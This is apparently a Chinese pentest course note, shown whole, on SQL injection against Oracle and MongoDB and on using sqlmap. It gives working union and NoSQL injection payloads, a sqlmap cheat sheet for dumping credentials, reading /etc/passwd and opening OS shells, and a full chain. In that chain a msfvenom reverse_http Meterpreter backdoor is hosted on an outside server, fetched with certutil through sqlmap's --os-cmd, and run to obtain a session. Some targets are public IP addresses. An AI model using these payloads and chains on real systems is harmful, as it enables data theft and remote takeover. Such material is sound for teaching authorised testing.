![1645006267622-a4898896-b6c3-41fe-8dc1-ce4cdc157308.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132439589-2065198281.png)

```plain
#知识点：
1、数据库注入-Oracle&Mongodb
2、数据库注入-DB2&SQLite&Sybase
3、SQL注入神器-SQLMAP安装使用拓展

#SQLMAP
-什么是SQLMAP？
-它支持那些数据库注入？
-它支持那些SQL注入模式？sqlmap不支持nosql注入
-它支持那些其他不一样功能？
-使用SQLMAP一般注入流程分析？

#SQL注入课程体系：
1.数据库注入    - access mysql mssql oracle mongodb postgresql等
2.数据类型注入 - 数字型 字符型 搜索型 加密型(base64 json)等
3.提交方式注入 - get post cookie http头等 
4.查询方式注入 - 查询 增加 删除 更新 堆叠等
5.复杂注入利用 - 二次注入 dnslog注入 绕过bypass等
```

![1645008898838-2b48f678-7bf9-459d-a06f-2ecdf3c7793e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132539246-36115509.png)

------

- 数据库注入-联合猜解-Oracle&Mongodb
- Oracle

```plain
参考文章：https://www.cnblogs.com/peterpan0707007/p/8242119.html
测字段：order by 2
```

![1645010034505-e06d1599-1756-4b36-87ac-e1665941a2d6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132513431-1649636380.png)



```plain
爆数字：union select '1','2' from dual
```

![1645010209892-b0d6fa48-801f-430c-a220-5409ec6c15de.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132511105-823880858.png)

```plain
爆表：and 1=2 union select '1',(select table_name from user_tables where rownum=1) from dual
记录表名字：LOGMNR_SESSION_EVOLVE$
但是这样查询过于复杂，不适用，所以有下面的模糊爆库
```

![1645010360304-b207f79c-c209-453c-9f10-c6e2f6fb99fd.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132510726-1471088798.png)

```plain
模糊爆表：and 1=2 union select '1',(select table_name from user_tables where rownum=1 and table_name like '%user%') from dual
记录表名：sns_users
```

![1645010789400-52b5c94a-3532-4244-b63a-0ca6db5aac20.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132510915-1113336943.png)

```plain
爆列名：and 1=2 union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users') from dual
爆其他列名：and 1=2 union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users' and column_name not in ('USER_NAME')) from dual
```

![1645010896358-07ce89a7-e3a1-4c10-922b-8f0f931a7ae0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132511114-103955937.png)

```plain
爆数据：and 1=2 union select user_name,user_pwd from "sns_users"
爆其他数据：and 1=2 union select user_name,user_pwd from "sns_users" where USER_NAME<>'hu'
```

![1645011155061-54ea3ada-0ced-45da-9d81-48c234884dab.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132604297-358155965.png)

![1645011108123-6be876d8-28c3-4f21-b210-889bac805687.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132608468-81621309.png)

```plain
经过md5解密，得到账号密码，登录，得到key,完成测试。
```

Mongodb

```plain
参考：https://www.runoob.com/mongodb/mongodb-query.html
这类型的数据库在python用的比较多。
启动靶场，发现关键性代码：
$query="var data=db.notice.findOne({'id':'$id'});return data;";这个是SQL执行语句，如果没有关键性代码，那么我们很难闭合这个符号，很难去猜解账号密码。
```

![1645011642696-733404a2-dfda-480d-87b7-30aeea5461ad.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132521287-379411331.png)

```plain
如何构造payload？
正常写法：select * from news where id=1
mdb数据库写法：select * from news where id={('$id')}，需要闭合符号

原始语句：db.notice.findOne({'id':'$id'});return data;
如果 ?id=1 order by 2
那么语句就会变成：db.notice.findOne({'id':‘1 order by 2’});return data;，语句不正确。
但是注入语句 ?id=1'}); return ({title:tojson(db),content:'1
那么语句就变成：db.notice.findOne({'id':‘1'}); return ({title:tojson(db),content:'1'});return data; ，就可以进行正常的注入。
测回显：/new_list.php?id=1'}); return ({title:1,content:'2
```

![1645012603798-16fa1dce-66cb-4081-94d1-5e38379cd3e5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132511662-766688999.png)

```plain
爆库：  /new_list.php?id=1'}); return ({title:tojson(db),content:'1
记录数据库：mozhe_cms_Authority
```

![1645012647787-2354cc19-fe88-4aea-9bde-d0866bcc7023.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132511880-1624057672.png)

```plain
爆表： /new_list.php?id=1'}); return ({title:tojson(db.getCollectionNames()),content:'1  
db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。
记录表名："Authority_confidential", "notice", "system.indexes"
```

![1645012716133-830d0f7c-4b49-41f9-9904-3f1216639ba7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132514213-2138427310.png)

```plain
爆字段：/new_list.php?id=1'}); return ({title:tojson(db.Authority_confidential.find()[0]),content:'1
db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据
```

![1645012843215-556e310f-922c-4526-8437-5c275faa0d0a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132514717-445053814.png)

------

- 数据库注入-SQLMAP-DB2&SQLite&Sybase

```plain
基本上数据库都差不多的，所有本次用到Oracle数据库作为实验。有一些数据库SQLmap不支持，比如nosql等。
测试注入点：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1"
测试的结果保存在：C:\Users\我是正经人z\AppData\Local\sqlmap\output\219.153.49.228
```

![1645016952672-47a44820-7de4-46a7-9a70-3b9ee657a0a0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515400-1341455740.png)

```plain
SQLmap使用步骤：
1、判断数据库注入点
2、判断注入点权限


#SQLMAP使用参数：
参考：https://www.cnblogs.com/bmjoker/p/9326258.html
基本操作笔记：-u  #注入点 
-f  #指纹判别数据库类型 
-b  #获取数据库版本信息 
-p  #指定可测试的参数(?page=1&id=2 -p "page,id") 
-D ""  #指定数据库名 
-T ""  #指定表名 
-C ""  #指定字段 
-s ""  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) 
--level=(1-5) #要执行的测试水平等级，默认为1 
--risk=(0-3)  #测试执行的风险等级，默认为1 
--time-sec=(2,5) #延迟响应，默认为5 
--data #通过POST发送数据 
--columns        #列出字段 
--current-user   #获取当前用户名称 
--current-db     #获取当前数据库名称 
--users          #列数据库所有用户 
--passwords      #数据库用户所有密码 
--privileges     #查看用户权限(--privileges -U root) 
-U               #指定数据库用户 
--dbs            #列出所有数据库 
--tables -D ""   #列出指定数据库中的表 
--columns -T "user" -D "mysql"      #列出mysql数据库中的user表的所有字段 
--dump-all            #列出所有数据库所有表 
--exclude-sysdbs      #只列出用户自己新建的数据库和表 
--dump -T "" -D "" -C ""   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
--dump -T "" -D "" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
--os      #指定系统(Linux,Windows) 
-v  #详细的等级(0-6) 
    0：只显示Python的回溯，错误和关键消息。 
    1：显示信息和警告消息。 
    2：显示调试消息。 
    3：有效载荷注入。 
    4：显示HTTP请求。 
    5：显示HTTP响应头。 
    6：显示HTTP响应页面的内容 
--privileges  #查看权限 
--is-dba      #是否是数据库管理员 
--roles       #枚举数据库用户角色 
--udf-inject  #导入用户自定义函数（获取系统权限） 
--union-check  #是否支持union 注入 
--union-cols #union 查询表记录 
--union-test #union 语句测试 
--union-use  #采用union 注入 
--union-tech orderby #union配合order by 
--data "" #POST方式提交数据(--data "page=1&id=2") 
--cookie "用;号分开"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) 
--referer ""     #使用referer欺骗(--referer "http://www.baidu.com") 
--user-agent ""  #自定义user-agent 
--proxy "http://127.0.0.1:8118" #代理注入 
--string=""    #指定关键词,字符串匹配. 
--threads 　　  #采用多线程(--threads 3) 
--sql-shell    #执行指定sql命令 
--sql-query    #执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) 
--file-read    #读取指定文件 
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
--file-dest    #要写入的文件绝对路径 
--os-cmd=id    #执行系统命令 
--os-shell     #系统交互shell 
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
--os-smbrelay  # 
--os-bof       # 
--reg-read     #读取win系统注册表 
--priv-esc     # 
--time-sec=    #延迟设置 默认--time-sec=5 为5秒 
-p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"  #指定user-agent注入 
--eta          #盲注 
/pentest/database/sqlmap/txt/
common-columns.txt　　字段字典　　　 
common-outputs.txt 
common-tables.txt      表字典 
keywords.txt 
oracle-default-passwords.txt 
user-agents.txt 
wordlist.txt 


常用语句 :
1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C "user,pass"  -v 1 --exclude-sysdbs 
5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read "c:\boot.ini" -v 2 
7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd "id" -v 1 
9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key="HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1 
14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
15./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
16./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
17./sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
18./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
19./sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1 
20./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner 
21./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --cookie="PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low" --string='xx' --dbs --level=3 -p "uid"


简单的注入流程 :
1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：
执行：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --privileges
这种比较难判断是不是管理员权限。
```

![1645017757731-7f56badf-435c-4440-8fe4-b224218751e5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132516189-365232428.png)

```plain
判断是否为最高权限：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --is-dba
这种判断是不是最高权限最好的方法。
```

![1645017833466-457c8397-d4c7-4fab-893d-088f21967d4f.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515645-143840635.png)

```plain
爆库(获取所有的数据库)：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --dbs
```

![1645018090493-3913ee4d-c5d8-4661-b0ec-bac34108cdf1.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515432-200492664.png)

```plain
获取当前数据库：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --current-db
```

![1645018213088-3ac5f203-8153-4084-bda9-a651852af57d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515382-1821991635.png)

```plain
获取指定的数据库的表：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --tables -D "SYSTEM"
```

![1645018506297-585a1e7e-ee63-4527-b9ad-c3ca736a254d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515635-1582334469.png)

```plain
获取指定数据库下表名的字段：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --columns -T "NOTICE"  -D "SYSTEM"
```

![1645019338646-cc8cdc6d-cdf4-43d3-bfa2-1b7b6798cdf7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515902-677696613.png)

```plain
获取数据：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --dump -C	"列名" -T "表名"
如果出现不同数据库相同的网站，那么就会有缓存，清除缓存：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --purge
```

------

- 数据库注入-SQLMAP-数据猜解&高权限读写执行

高权限读写执行

```plain
如果用数据包去进行测试，那么需要在数据包上注入点中加上*号，然后用到-r 参数进行测试。（数据包保存为文本文件）
测试目标：47.94.200.108:888
抓取登录框数据包
POST /Login/ValidateLogin HTTP/1.1
Host: 47.94.200.108:888
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://47.94.200.108:888/Login/index
Content-Length: 32
Cookie: Hm_lvt_8ee3ec23e73c6dcda2c7c9c489c151aa=1645057307; Hm_lpvt_8ee3ec23e73c6dcda2c7c9c489c151aa=1645057307
DNT: 1
Connection: close

userName=admin&password=12456789

在SQLmap运行目录生成1.txt文件，保存数据包
```

![1645057544219-badeff3a-2bb2-43ab-bc70-317e43ef0453.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132519305-1644180661.png)

```plain
执行：python310 sqlmap.py -r 1.txt
但是最后测试没有注入点
```

![1645057814003-c0919162-c1e7-4c2e-a9e8-59c0e30de097.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515576-1424915675.png)

```plain
但是经过手工测试，证明注入点还有。在admin下面加上'来进行测试。但是最后测试还是没有注入点。
```

![1645057921078-ef610bb2-aa7e-4506-a6f5-38b4a62d50fa.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515820-601843129.png)

```plain
查看权限：python310 sqlmap.py -r 1.txt --is-dba
执行命令(交互式)：python310 sqlmap.py -r 1.txt --os-shell
本次用本地案例来进行代替。
本地联动msf
则python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1"
```

![1645060290518-b350fcd2-c34b-4f1d-8522-dde1459629e9.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132516823-913999468.png)

```plain
判断高权限：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --is-dba
```

![1645060569138-f3d8756b-edd0-4447-9a67-aef2014967b7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515190-958000466.png)

```plain
进行命令执行：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --os-shell
```

![1645060816882-34a028e6-a09f-46ad-9db9-f394711eada1.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515453-1781262971.png)

```plain
在msf中生成一个后门： msfvenom -p windows/meterpreter/reverse_http lhost=47.100.167.248 lport=1111 -f exe -o sql.exe
```

![1645064915968-99bb6e82-a5c1-43b1-a3ae-3aa79de63788.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132518525-182636984.png)

```plain
放在阿里云网站目录上，访问www.mumuxi8.com/sql.exe进行下载。这里我们远程执行命令，利用命令行下载：certutil.exe -urlcache -split -f http://www.mumuxi8.com:80/sql.exe d:/sql.exe
msf监听1111端口：
use exploit/multi/handler 
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 1111
run
```

![1645065401648-224ee3f4-363f-458b-9c7c-772a83baf197.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515596-225834953.png)

```plain
用到高权限SQL注入进行文件读取：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --file-read "d:/w.txt"
读取的结果保存在了文件中。路径：C:\Users\我是正经人z\AppData\Local\sqlmap\output\127.0.0.1\files
```

![1645065845093-340e656c-4846-4cbf-8c4d-75cc017baa1c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132517217-1064852099.png)

```plain
写入文件：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --file-write "d:/w.txt" --file-dest "d:/1.txt" 
w.txt是要写的文件（本地），1.txt是后门文件（远程）
```

![1645066215520-a8b5ce3f-3cdc-40ae-9e49-d6141e81f359.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132519442-1687869356.png)

![1645066232540-3b2c1490-7465-41d8-9fe3-34dff07918f2.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132512979-251556262.png)

```plain
命令执行：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --os-cmd="certutil.exe -urlcache -split -f http://www.mumuxi8.com:80/sql.exe d:/sql.exe"
```

![1645066440811-0cdb8f94-5332-4533-afc6-99e408040bb7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515836-2004167529.png)

![1645066467779-37c6876c-3c8f-4cd5-91cc-92f7639b0927.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132513530-2012553424.png)

```plain
命令执行，执行后门代码上线：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --os-cmd="d:/sql.exe"
执行成功，收到会话。
```

![1645066580754-6c9f8006-ee69-41d8-8e94-604a918dfe6e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132517336-1520202008.png)

![1645066639937-9b9b9657-a0bf-4452-85ea-14fa45e025e6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132515750-1542695345.png)